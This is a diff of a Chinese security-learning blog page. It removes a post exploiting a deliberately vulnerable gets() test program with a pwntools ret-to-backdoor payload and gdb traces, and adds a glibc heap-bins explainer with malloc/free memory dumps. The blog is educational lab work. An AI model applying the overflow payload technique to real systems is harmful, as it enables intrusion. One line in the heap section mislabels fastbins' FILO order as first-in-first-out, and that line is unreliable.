@@ -4,15 +4,9 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="偶遇栈平衡, Matrix">
-    <meta name="description" content="1：我自己写的一个简单程序#include&amp;lt;stdio.h&gt;
-#include&amp;lt;unistd.h&gt;
-#include&amp;lt;stdlib.h&gt;
-int main()
-{
-
-    char s[50];
-    puts(&#34;wh">
+    <meta name="keywords" content="Heap--初探--bins神将, Matrix">
+    <meta name="description" content="Previously on Heap–初探–chunk的获取与释放：我们当时最大的疑惑差不多就是Free后的chunks都怎么了，这里来逐一解答。
+前情提要ptmalloc 会统一管理 heap 和 mmap 映射区域中的空闲的 chunk">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -20,7 +14,7 @@ int main()
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>偶遇栈平衡 | Matrix</title>
+    <title>Heap--初探--bins神将 | Matrix</title>
     <link rel="icon" type="image/jpeg" href="/medias/matrix.jpg">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -204,13 +198,13 @@ int main()
 
 
 
-<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
+<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/5.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        偶遇栈平衡
+                        Heap--初探--bins神将
                     </div>
                 </div>
             </div>
@@ -326,21 +320,21 @@ int main()
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-07-08
+                    2020-09-07
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        721
+                        1.1k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        3 分
+                        4 分
                     </div>
                     
                 
@@ -356,152 +350,72 @@ int main()
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="1：我自己写的一个简单程序"><a href="#1：我自己写的一个简单程序" class="headerlink" title="1：我自己写的一个简单程序"></a>1：我自己写的一个简单程序</h2><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;unistd.h></span></span>
+                <p>Previously on Heap–初探–chunk的获取与释放：我们当时最大的疑惑差不多就是Free后的chunks都怎么了，这里来逐一解答。</p>
+<h2 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h2><p>ptmalloc 会统一管理 heap 和 mmap 映射区域中的空闲的 chunk。当用户再一次请求分配内存时，ptmalloc 分配器会试图在空闲的 chunk 中挑选一块合适的给用户。这样可以避免频繁的系统调用，降低内存分配的开销。<br>如果实在没有合适的就让商人去top chunk切一块下来<br>之后我们堆管理器的操作都是以chunk为最小单元，然后一般说的都是chunk地址而不是user_data_start 地址</p>
+<h3 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h3><p>链表的每个单元都由数据域与指针域组成。<br>单项链表：<br><img src="https://s1.ax1x.com/2020/09/07/wKAqt1.png" alt=""></p>
+<p>双向循环链表:<br><img src="https://s1.ax1x.com/2020/09/07/wKALfx.png" alt=""></p>
+<h2 id="Fastbins"><a href="#Fastbins" class="headerlink" title="Fastbins"></a>Fastbins</h2><blockquote>
+<p>大多数程序经常会申请以及释放一些比较小的内存块。如果将一些较小的 chunk 释放之后发现存在与之相邻的空闲的 chunk 并将它们进行合并，那么当下一次再次申请相应大小的 chunk 时，就需要对 chunk 进行分割，这样就大大降低了堆的利用效率。因为我们把大部分时间花在了合并、分割以及中间检查的过程中。<br>因此，ptmalloc 中专门设计了 fast bin–ctfwiki-pwn<br>为了提高chunk获取和释放的效率，fastbins采用单链表数据结构来存储对应大小的free chunks，并且采用了FILO策略先进先出，利用的是fd进行单链表链接，而不是bk。链表如下：<br><img src="https://s1.ax1x.com/2020/09/07/wKAbkR.png" alt=""><br>所以在free一个可以被放入fastbins的chunk后，他会像压入栈里面一样压入对应的bin（对应大小的bin）中同时其fd会被填入free chunk3的地址（如上图）<br>这就是为啥之前我们在free一个chunk后（被放入了fastbins）我们再去看那个chunk里面的数据fd字段改变的原因。<br>例子：</p>
+</blockquote>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
 <span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span>
+
 <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span class="token punctuation">{</span>
+    <span class="token keyword">void</span><span class="token operator">*</span> p1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">void</span><span class="token operator">*</span> p2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">void</span><span class="token operator">*</span> p3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">void</span><span class="token operator">*</span> p4 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-    <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"what"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token function">gets</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
- <span class="token function">puts</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-
+    <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">free</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">free</span><span class="token punctuation">(</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">free</span><span class="token punctuation">(</span>p4<span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-
-<span class="token keyword">void</span> <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
-    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat test.py"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
 <span class="token punctuation">}</span></code></pre>
-<p>溢出漏洞显而易见</p>
-<h2 id="2：checksec"><a href="#2：checksec" class="headerlink" title="2：checksec"></a>2：checksec</h2><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/buu-pwn$ checksec <span class="token function">test</span>
-<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/buu-pwn/test'</span>
-    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span></code></pre>
-<p>64位常规操作</p>
-<h2 id="3：IDA"><a href="#3：IDA" class="headerlink" title="3：IDA"></a>3：IDA</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
-  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-40h]</span>
-
-  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"what"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> argv<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-
-有个backdoor函数
-<span class="token keyword">int</span> <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
-  <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat test.py"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span></code></pre>
-<h2 id="4：gdb溢出点72"><a href="#4：gdb溢出点72" class="headerlink" title="4：gdb溢出点72"></a>4：gdb溢出点72</h2><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>
-   0x4005a3 <span class="token operator">&lt;</span>main+44<span class="token operator">></span>:    call   0x400460 <span class="token operator">&lt;</span>puts@plt<span class="token operator">></span>
-   0x4005a8 <span class="token operator">&lt;</span>main+49<span class="token operator">></span>:    mov    eax,0x0
-   0x4005ad <span class="token operator">&lt;</span>main+54<span class="token operator">></span>:    leave  
-<span class="token operator">=</span><span class="token operator">></span> 0x4005ae <span class="token operator">&lt;</span>main+55<span class="token operator">></span>:    ret    
-   0x4005af <span class="token operator">&lt;</span>backdoor<span class="token operator">></span>:    push   rbp
-   0x4005b0 <span class="token operator">&lt;</span>backdoor+1<span class="token operator">></span>:    mov    rbp,rsp
-   0x4005b3 <span class="token operator">&lt;</span>backdoor+4<span class="token operator">></span>:    lea    rdi,<span class="token punctuation">[</span>rip+0x9f<span class="token punctuation">]</span>        <span class="token comment" spellcheck="true"># 0x400659</span>
-   0x4005ba <span class="token operator">&lt;</span>backdoor+11<span class="token operator">></span>:    call   0x400470 <span class="token operator">&lt;</span>system@plt<span class="token operator">></span>
-<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>
-0000<span class="token operator">|</span> 0x7fffffffde88 <span class="token punctuation">(</span><span class="token string">"IAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="token punctuation">)</span>
-0008<span class="token operator">|</span> 0x7fffffffde90 <span class="token punctuation">(</span><span class="token string">"AJAAfAA5AAKAAgAA6AAL"</span><span class="token punctuation">)</span>
-0016<span class="token operator">|</span> 0x7fffffffde98 <span class="token punctuation">(</span><span class="token string">"AAKAAgAA6AAL"</span><span class="token punctuation">)</span>
-0024<span class="token operator">|</span> 0x7fffffffdea0 --<span class="token operator">></span> 0x4c414136 <span class="token punctuation">(</span><span class="token string">'6AAL'</span><span class="token punctuation">)</span>
-0032<span class="token operator">|</span> 0x7fffffffdea8 --<span class="token operator">></span> 0x400577 <span class="token punctuation">(</span><span class="token operator">&lt;</span>main<span class="token operator">></span>:    push   rbp<span class="token punctuation">)</span>
-0040<span class="token operator">|</span> 0x7fffffffdeb0 --<span class="token operator">></span> 0x0 
-0048<span class="token operator">|</span> 0x7fffffffdeb8 --<span class="token operator">></span> 0xb7de885b3d5ed61a 
-0056<span class="token operator">|</span> 0x7fffffffdec0 --<span class="token operator">></span> 0x400490 <span class="token punctuation">(</span><span class="token operator">&lt;</span>_start<span class="token operator">></span>:    xor    ebp,ebp<span class="token punctuation">)</span>
-<span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>
-Legend: code, data, rodata, value
-0x00000000004005ae <span class="token keyword">in</span> main <span class="token punctuation">(</span><span class="token punctuation">)</span>
-gdb-peda$ pattern offset AAdAA3
-AAdAA3 found at offset: 64
-gdb-peda$ pattern offset IAAeA
-IAAeA found at offset: 72
-gdb-peda$ </code></pre>
-<p>感觉没啥问题</p>
-<h2 id="5：exp"><a href="#5：exp" class="headerlink" title="5：exp"></a>5：exp</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
-context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
-
-sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./test'</span><span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token comment" spellcheck="true">#使程序跳转到backdoor函数即可</span>
-payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">72</span> <span class="token operator">+</span>   p64<span class="token punctuation">(</span><span class="token number">0x04005af</span><span class="token punctuation">)</span>
-gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-
-sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
-<h2 id="6：执行情况（gdb调试）"><a href="#6：执行情况（gdb调试）" class="headerlink" title="6：执行情况（gdb调试）"></a>6：执行情况（gdb调试）</h2><pre class=" language-bash"><code class="language-bash">RDI: 0x2 
-RBP: 0x7fffffffdd88 --<span class="token operator">></span> 0x0 
-RSP: 0x7fffffffdd28 --<span class="token operator">></span> 0x0 
-RIP: 0x7ffff7a332f6 <span class="token punctuation">(</span><span class="token operator">&lt;</span>do_system+1094<span class="token operator">></span>:    movaps XMMWORD PTR <span class="token punctuation">[</span>rsp+0x40<span class="token punctuation">]</span>,xmm0<span class="token punctuation">)</span>
-R8 <span class="token keyword">:</span> 0x7ffff7dd1600 --<span class="token operator">></span> 0x0 
-R9 <span class="token keyword">:</span> 0x0 
-R10: 0x8 
-R11: 0x246 
-R12: 0x400659 <span class="token punctuation">(</span><span class="token string">"cat test.py"</span><span class="token punctuation">)</span>
-R13: 0x7fffffffdfa0 --<span class="token operator">></span> 0x1 
-R14: 0x0 
-R15: 0x0
-EFLAGS: 0x10246 <span class="token punctuation">(</span>carry PARITY adjust ZERO sign <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span>
-<span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>
-   0x7ffff7a332e6 <span class="token operator">&lt;</span>do_system+1078<span class="token operator">></span>:    movq   xmm0,QWORD PTR <span class="token punctuation">[</span>rsp+0x8<span class="token punctuation">]</span>
-   0x7ffff7a332ec <span class="token operator">&lt;</span>do_system+1084<span class="token operator">></span>:    mov    QWORD PTR <span class="token punctuation">[</span>rsp+0x8<span class="token punctuation">]</span>,rax
-   0x7ffff7a332f1 <span class="token operator">&lt;</span>do_system+1089<span class="token operator">></span>:    movhps xmm0,QWORD PTR <span class="token punctuation">[</span>rsp+0x8<span class="token punctuation">]</span>
-<span class="token operator">=</span><span class="token operator">></span> 0x7ffff7a332f6 <span class="token operator">&lt;</span>do_system+1094<span class="token operator">></span>:    movaps XMMWORD PTR <span class="token punctuation">[</span>rsp+0x40<span class="token punctuation">]</span>,xmm0     <span class="token comment" spellcheck="true">#程序到这里死活不能动</span>
-   0x7ffff7a332fb <span class="token operator">&lt;</span>do_system+1099<span class="token operator">></span>:    call   0x7ffff7a23110 <span class="token operator">&lt;</span>__GI___sigaction<span class="token operator">></span>
-   0x7ffff7a33300 <span class="token operator">&lt;</span>do_system+1104<span class="token operator">></span>:    lea    rsi,<span class="token punctuation">[</span>rip+0x39e2f9<span class="token punctuation">]</span>        <span class="token comment" spellcheck="true"># 0x7ffff7dd1600 &lt;quit></span>
-   0x7ffff7a33307 <span class="token operator">&lt;</span>do_system+1111<span class="token operator">></span>:    xor    edx,edx
-   0x7ffff7a33309 <span class="token operator">&lt;</span>do_system+1113<span class="token operator">></span>:    mov    edi,0x3
-<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>
-0000<span class="token operator">|</span> 0x7fffffffdd28 --<span class="token operator">></span> 0x0 
-0008<span class="token operator">|</span> 0x7fffffffdd30 --<span class="token operator">></span> 0x7ffff7b97e97 --<span class="token operator">></span> 0x2f6e69622f00632d <span class="token punctuation">(</span><span class="token string">'-c'</span><span class="token punctuation">)</span>
-0016<span class="token operator">|</span> 0x7fffffffdd38 --<span class="token operator">></span> 0x0 
-0024<span class="token operator">|</span> 0x7fffffffdd40 --<span class="token operator">></span> 0x1 
-0032<span class="token operator">|</span> 0x7fffffffdd48 --<span class="token operator">></span> 0x7ffff7a33360 <span class="token punctuation">(</span><span class="token operator">&lt;</span>cancel_handler<span class="token operator">></span>:    push   rbx<span class="token punctuation">)</span>
-0040<span class="token operator">|</span> 0x7fffffffdd50 --<span class="token operator">></span> 0x7fffffffdd44 --<span class="token operator">></span> 0xf7a3336000000000 
-0048<span class="token operator">|</span> 0x7fffffffdd58 --<span class="token operator">></span> 0x0 
-0056<span class="token operator">|</span> 0x7fffffffdd60 --<span class="token operator">></span> 0x0 
-<span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>
-Legend: code, data, rodata, value
-Stopped reason: SIGSEGV
-0x00007ffff7a332f6 <span class="token keyword">in</span> do_system <span class="token punctuation">(</span>line<span class="token operator">=</span>0x400659 <span class="token string">"cat test.py"</span><span class="token punctuation">)</span> at <span class="token punctuation">..</span>/sysdeps/posix/system.c:125
-125    <span class="token punctuation">..</span>/sysdeps/posix/system.c: 没有那个文件或目录.
-gdb-peda$ </code></pre>
-<h2 id="7：原因"><a href="#7：原因" class="headerlink" title="7：原因"></a>7：原因</h2><p><strong>向大佬求助得知，奈何涉及堆栈平衡，适时吾甚愚昧不知所云，只可将0x7ffff7a332f6 &lt;do_system+1094&gt;:    movaps XMMWORD PTR [rsp+0x40],xmm0指令铭记于心，付以esp寄存器需需结尾为0</strong><br><strong>若想根治则反复使用pop  ， ret指令平衡参数或跳转。以及自制代码buf莫要随意限其大小，常见128，512甚好（8的整数倍）</strong></p>
-<h3 id="修改利用ret指令"><a href="#修改利用ret指令" class="headerlink" title="修改利用ret指令"></a>修改利用ret指令</h3><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0xd3 bytes:
-    <span class="token string">'from pwn import*\n'</span>
-    <span class="token string">"context.log_level = 'debug'\n"</span>
-    <span class="token string">'\n'</span>
-    <span class="token string">"sh = process('./test')\n"</span>
-    <span class="token string">'sh.recv()\n'</span>
-    <span class="token string">'#0x000000000040044e : ret\n'</span>
-    <span class="token string">"payload = 'A'*72 + p64(0x040044e) +  p64(0x04005af)\n"</span>
-    <span class="token string">'gdb.attach(sh)\n'</span>
-    <span class="token string">'sh.sendline(payload)\n'</span>
-    <span class="token string">'\n'</span>
-    <span class="token string">'sh.interactive()\n'</span>
-from pwn import*
-context.log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
-
-sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./test'</span><span class="token punctuation">)</span>
-sh.recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token comment" spellcheck="true">#0x000000000040044e : ret</span>
-payload <span class="token operator">=</span> <span class="token string">'A'</span>*72 + p64<span class="token punctuation">(</span>0x040044e<span class="token punctuation">)</span> +  p64<span class="token punctuation">(</span>0x04005af<span class="token punctuation">)</span>
-gdb.attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>
-sh.sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-
-sh.interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got EOF <span class="token keyword">while</span> reading <span class="token keyword">in</span> interactive
-$  </code></pre>
-<p><strong>所以以后能跳转到system函数时出错看看是不是这个原因</strong></p>
+<p>gdb执行到return 0；</p>
+<pre class=" language-java"><code class="language-java">In file<span class="token operator">:</span> <span class="token operator">/</span>home<span class="token operator">/</span>matrix<span class="token operator">/</span>test<span class="token punctuation">.</span>c
+   <span class="token number">10</span> 
+   <span class="token number">11</span>     <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token number">12</span>     <span class="token function">free</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token number">13</span>     <span class="token function">free</span><span class="token punctuation">(</span>p3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token number">14</span>     <span class="token function">free</span><span class="token punctuation">(</span>p4<span class="token punctuation">)</span><span class="token punctuation">;</span>
+ ► <span class="token number">15</span>     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+   <span class="token number">16</span> <span class="token punctuation">}</span>
+──────────────────────────────────────────────────────────────────<span class="token punctuation">[</span> STACK <span class="token punctuation">]</span>──────────────────────────────────────────────────────────────────
+<span class="token number">00</span><span class="token operator">:</span><span class="token number">0000</span>│ rsp  <span class="token number">0x7fffffffdda0</span> —▸ <span class="token number">0x602010</span> ◂— <span class="token number">0x0</span>
+<span class="token number">01</span><span class="token operator">:</span><span class="token number">0008</span>│      <span class="token number">0x7fffffffdda8</span> —▸ <span class="token number">0x602040</span> —▸ <span class="token number">0x602000</span> ◂— <span class="token number">0x0</span>
+<span class="token number">02</span><span class="token operator">:</span><span class="token number">0010</span>│      <span class="token number">0x7fffffffddb0</span> —▸ <span class="token number">0x602070</span> —▸ <span class="token number">0x602030</span> ◂— <span class="token number">0x0</span>
+<span class="token number">03</span><span class="token operator">:</span><span class="token number">0018</span>│      <span class="token number">0x7fffffffddb8</span> —▸ <span class="token number">0x6020a0</span> —▸ <span class="token number">0x602060</span> ◂— <span class="token number">0x0</span>
+<span class="token number">04</span><span class="token operator">:</span><span class="token number">0020</span>│ rbp  <span class="token number">0x7fffffffddc0</span> —▸ <span class="token function">0x4005e0</span> <span class="token punctuation">(</span>__libc_csu_init<span class="token punctuation">)</span> ◂— push   r15
+<span class="token number">05</span><span class="token operator">:</span><span class="token number">0028</span>│      <span class="token number">0x7fffffffddc8</span> —▸ <span class="token function">0x7ffff7a2d840</span> <span class="token punctuation">(</span>__libc_start_main<span class="token operator">+</span><span class="token number">240</span><span class="token punctuation">)</span> ◂— mov    edi<span class="token punctuation">,</span> eax
+<span class="token number">06</span><span class="token operator">:</span><span class="token number">0030</span>│      <span class="token number">0x7fffffffddd0</span> ◂— <span class="token number">0x1</span>
+<span class="token number">07</span><span class="token operator">:</span><span class="token number">0038</span>│      <span class="token number">0x7fffffffddd8</span> —▸ <span class="token number">0x7fffffffdea8</span> —▸ <span class="token number">0x7fffffffe249</span> ◂— <span class="token string">'/home/matrix/a.out'</span>
+────────────────────────────────────────────────────────────────<span class="token punctuation">[</span> BACKTRACE <span class="token punctuation">]</span>────────────────────────────────────────────────────────────────
+ ► f <span class="token number">0</span>           4005d6 main<span class="token operator">+</span><span class="token number">112</span>
+   f <span class="token number">1</span>     7ffff7a2d840 __libc_start_main<span class="token operator">+</span><span class="token number">240</span>
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg<span class="token operator">></span> x<span class="token operator">/</span>32gx <span class="token number">0x602010-</span><span class="token number">0x10</span>
+<span class="token number">0x602000</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000031</span>  <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span> chunk1
+<span class="token number">0x602010</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span>  
+<span class="token number">0x602020</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span> 
+<span class="token number">0x602030</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000031</span>  <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span> chunk2
+<span class="token number">0x602040</span><span class="token operator">:</span>    <span class="token number">0x0000000000602000</span>    <span class="token number">0x0000000000000000</span>
+<span class="token number">0x602050</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span>
+<span class="token number">0x602060</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000031</span>  <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span> chunk3
+<span class="token number">0x602070</span><span class="token operator">:</span>    <span class="token number">0x0000000000602030</span>    <span class="token number">0x0000000000000000</span>
+<span class="token number">0x602080</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span>
+<span class="token number">0x602090</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000031</span>  <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span> chunk4
+<span class="token number">0x6020a0</span><span class="token operator">:</span>    <span class="token number">0x0000000000602060</span>    <span class="token number">0x0000000000000000</span>
+<span class="token number">0x6020b0</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span>
+<span class="token number">0x6020c0</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000020f41</span>  <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span> top chunk
+<span class="token number">0x6020d0</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span></code></pre>
+<p>可以看到在free了这四个一样的chunk后：chunk4=====&gt;chunk3=====&gt;chunk2=====&gt;chunk1<br><strong>注意这里按理说前一个chunk是free状态然后当前chunk 的size的最后位应该置0。但是这里设计fastbins为了防止相邻两的freechunk合并的情况，就把里面的free chunk的size最后的P位都置1，因为合并后可能又要分类啥的太花费时间了。</strong></p>
+<h2 id="其他bins"><a href="#其他bins" class="headerlink" title="其他bins"></a>其他bins</h2><p>除了fastbins（tache）其他的bins都是双向链表结构。很相似（除largebins）如下。其数据存放规则是FIFO：先进先出<br><img src="https://s1.ax1x.com/2020/09/07/wKV1VH.png" alt=""></p>
+<h3 id="unsortedbin"><a href="#unsortedbin" class="headerlink" title="unsortedbin"></a>unsortedbin</h3><p>存放刚刚释放还未分类且无法进入fastbins中的free chunks，相当于相当于small bins 和large bins的缓冲区。<br><strong>如果用户malloc的大小大于fastbins里面的free chunks那么对管理器会先在unsorted bin中找，如果没找到就会触发unsorted bin中的free chunks遍历并合并，归类到他们该去的bins</strong><br>这里面的chunks很没有规律，大大小小的都有，只有一个bin来存放，是名副其实的垃圾堆。但是可以减少程序中的碎片free chunks</p>
+<h3 id="smallbins"><a href="#smallbins" class="headerlink" title="smallbins"></a>smallbins</h3><p>small bins 中每个 chunk 的大小与其所在的 bin 的 index 的关系为：chunk_size = 2 * SIZE_SZ *index，具体如下<br> 下标 | SIZE_SZ=4（32 位）| SIZE_SZ=8（64 位）<br>–:|:—:|:–<br>2 | 16 | 32<br>3 | 24 | 48<br>4 | 32 | 64<br>5 | 40 | 80<br>x | 2*4*x | 2*8*x<br>63 | 504 | 1008<br>每个bin链表中存放的chunks大小都一致</p>
+<p>可以发现这里的free chunks大小与fastbins中的大小是有一部分重叠的，这背后的原理比较复杂先暂且放放。</p>
+<h3 id="largebins"><a href="#largebins" class="headerlink" title="largebins"></a>largebins</h3><p>有63个bins，管理大于1008bytes的free chunks （64位）但是在基础heap题中一般不会遇到</p>
 
             </div>
             <hr/>
@@ -642,7 +556,7 @@ $  </code></pre>
                     </span>
                     <a href="http://squarepants0.github.io" class="b-link-green">Matrix</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2020/07/08/ou-yu-zhan-ping-heng/" class="b-link-green">偶遇栈平衡</a>
+                    <a href="/2020/09/07/heap-chu-tan-bins-shen-jiang/" class="b-link-green">Heap--初探--bins神将</a>
                 </p>
             </div>
         </div>
@@ -664,7 +578,7 @@ $  </code></pre>
         repo: 'Gitalks.github.io',
         owner: 'squarepants0',
         admin: "squarepants0",
-        id: '2020-07-08T13-02-24',
+        id: '2020-09-07T20-36-11',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -685,27 +599,27 @@ $  </code></pre>
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2020/07/10/zheng-mi-x64/">
+                <a href="/2020/09/07/heap-chu-tan-bins-shen-jiang/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="蒸米X64">
+                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="Heap--初探--bins神将">
                         
